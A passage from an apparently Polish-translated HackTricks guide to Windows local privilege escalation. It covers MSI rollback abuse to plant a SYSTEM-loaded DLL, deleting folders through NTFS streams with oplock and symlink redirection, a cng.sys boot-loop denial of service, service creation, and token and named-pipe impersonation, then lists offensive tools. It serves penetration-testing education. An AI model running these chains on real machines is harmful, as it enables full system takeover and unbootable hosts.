- Ustaw **weak DACLs** (np. Everyone:F) i **pozostaw otwarty handle** z `WRITE_DAC`.

- Step 7: Uruchomienie kolejnej instalacji
- Zainstaluj ponownie plik `.msi` z:
- `TARGETDIR`: Lokalizacja z prawem zapisu.
- `ERROROUT`: Zmienna, która wywołuje wymuszoną awarię.
- Ta instalacja zostanie użyta do ponownego uruchomienia **rollback**, który odczytuje `.rbs` i `.rbf`.

- Step 8: Monitorowanie `.rbs`
- Użyj `ReadDirectoryChangesW` do monitorowania `C:\Config.Msi`, aż pojawi się nowy plik `.rbs`.
- Zapisz jego nazwę.

- Step 9: Synchronizacja przed Rollback
- Plik `.msi` zawiera **custom install action (`SyncBeforeRollback`)**, która:
- Sygnalizuje zdarzenie, gdy plik `.rbs` zostanie utworzony.
- Następnie **czeka** przed kontynuowaniem.

- Step 10: Ponowne zastosowanie słabych ACL
- Po otrzymaniu zdarzenia ` .rbs created`:
- Windows Installer **ponownie stosuje silne ACL** do `C:\Config.Msi`.
- Ponieważ jednak nadal masz handle z `WRITE_DAC`, możesz **ponownie zastosować słabe ACL**.

> ACL są **egzekwowane wyłącznie podczas otwierania handle**, więc nadal możesz zapisywać do folderu.

- Step 11: Umieszczenie fałszywych `.rbs` i `.rbf`
- Zastąp zawartość pliku `.rbs` **fałszywym skryptem rollback**, który instruuje Windows, aby:
- Przywrócił twój plik `.rbf` (złośliwy DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Umieść swój fałszywy `.rbf`, zawierający **złośliwy DLL z payloadem na poziomie SYSTEM**.

- Step 12: Uruchomienie Rollback
- Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
- Skonfigurowano **custom action typu 19 (`ErrorOut`)**, która ma **celowo zakończyć instalację błędem** w określonym momencie.
- Powoduje to **rozpoczęcie rollback**.

- Step 13: SYSTEM instaluje twój DLL
- Windows Installer:
- Odczytuje twój złośliwy `.rbs`.
- Kopiuje DLL z `.rbf` do lokalizacji docelowej.
- Teraz masz **złośliwy DLL w ścieżce ładowanej przez SYSTEM**.

- Final Step: Wykonanie kodu SYSTEM
- Uruchom zaufany **auto-elevated binary** (np. `osk.exe`), który załaduje przejęty DLL.
- **Boom**: Twój kod zostaje wykonany **jako SYSTEM**.


### Z Arbitrary File Delete/Move/Rename do SYSTEM EoP

Główna technika MSI rollback (opisana wcześniej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli twoja vulnerability umożliwia tylko **arbitrary file deletion**?

Możesz wykorzystać **mechanizmy wewnętrzne NTFS**: każdy folder ma ukryty alternate data stream o nazwie:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, system plików NTFS **usunie cały folder**.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twój primitive nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder i plik-przynętę
- Utwórz: `C:\temp\folder1`
- Wewnątrz niego: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacku.

4. Krok 4: W callbacku oplock — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
- Spowoduje to opróżnienie `folder1` bez przerywania oplock.
- Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplock.

- Opcja B: Przekształć `folder1` w **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Atakuje to wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje działanie i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, faktycznie usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Wynik**: `C:\Config.Msi` zostało usunięte przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz ją wcześniej jako folder**, Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może rozwiązać właściwego sterownika** i **powoduje awarię lub zatrzymuje uruchamianie systemu**.
- **Nie ma mechanizmu awaryjnego** ani możliwości **odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Z uprzywilejowanych ścieżek logów/kopii zapasowych + dowiązania symboliczne OM do dowolnego nadpisywania plików / DoS podczas uruchamiania

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty do ścieżki odczytanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **dowiązań symbolicznych Object Manager + punktów montowania NTFS**, aby przekształcić uprzywilejowany zapis w dowolne nadpisanie pliku (nawet **bez SeCreateSymbolicLinkPrivilege**).

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i dowiązania symbolicznego pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uprzywilejowana operacja zapisująca do tej ścieżki (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby odzyskać docelową lokalizację uprzywilejowanego logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator uruchomi „send test SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany cel (parserem hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie wymusza załadowanie przez Windows zmodyfikowanej ścieżki sterownika → **boot loop DoS**. Dotyczy to również dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia istnieje w `C:\Windows\System32\cng.sys`, może zostać podjęta próba załadowania jej w pierwszej kolejności, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Z High Integrity do System**

### **New service**

Jeśli proces działa już z poziomem High Integrity, **path to SYSTEM** może być prosty — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest prawidłową usługą lub że plik binarny wykonuje niezbędne działania wystarczająco szybko, ponieważ zostanie zabity po 20 s, jeśli nie będzie prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokiej integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell za pomocą wrappera _**.msi**_.\
[Więcej informacji o powiązanych kluczach rejestru i sposobie instalowania pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli posiadasz te token privileges (prawdopodobnie znajdziesz je w już istniejącym procesie o wysokiej integralności), będziesz w stanie **otworzyć niemal dowolny proces** (z wyjątkiem protected processes) za pomocą privilege SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Korzystając z tej techniki, zwykle **wybiera się dowolny proces działający jako SYSTEM ze wszystkimi token privileges** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich token privileges_).\
**Przykład kodu wykonującego proponowaną technikę** [**znajdziesz tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ta technika jest używana przez meterpreter do eskalacji w `getsystem`. Polega ona na **utworzeniu pipe'a, a następnie utworzeniu lub wykorzystaniu usługi do zapisu do tego pipe'a**. Następnie **server**, który utworzył pipe'a przy użyciu privilege **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe'a (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o named pipes, przeczytaj to**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia z wysokiej integralności do System przy użyciu named pipes, przeczytaj to**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll**, która jest **ładowana** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny w tego rodzaju eskalacji uprawnień, a ponadto jest znacznie **łatwiejszy do przeprowadzenia z procesu o wysokiej integralności**, ponieważ będzie on miał **uprawnienia zapisu** do folderów używanych do ładowania dll.\
**Więcej o Dll hijacking** [**znajdziesz tutaj**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza błędne konfiguracje i poufne pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza niektóre możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje sesji PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj opcji -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia dane uwierzytelniające z Credential Manager. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Wykonuje password spraying zebranych haseł w całej domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS oraz man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane vulnerabilities związane z privesc (DEPRECATED na rzecz Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagają praw Administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane vulnerabilities związane z privesc (musi zostać skompilowany przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (musi zostać skompilowany) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia dane uwierzytelniające z wielu programów (precompiled exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sprawdza błędne konfiguracje (precompiled executable na github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego posta (nie wymaga accesschk do prawidłowego działania, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu właściwej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencje

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: phishing za pomocą makra Word VBA przez SMTP → odszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokenu kernela](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Pościg za Silver Fox: gra w kotka i myszkę w cieniu kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Luka w uprzywilejowanym systemie plików występująca w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Narzędzia do testowania dowiązań symbolicznych – użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Powrót do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Upadki zaufania Node.js: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - rozwiązane zadania z checklisty C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [Pwn2Own z Microslop: łączenie warunków wyścigu CLDFLT i DirectX Kernel w celu uzyskania Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [Jeden I/O Ring, aby wszystkimi rządzić: pełny prymityw exploitów odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)

{{#include ../../banners/hacktricks-training.md}}
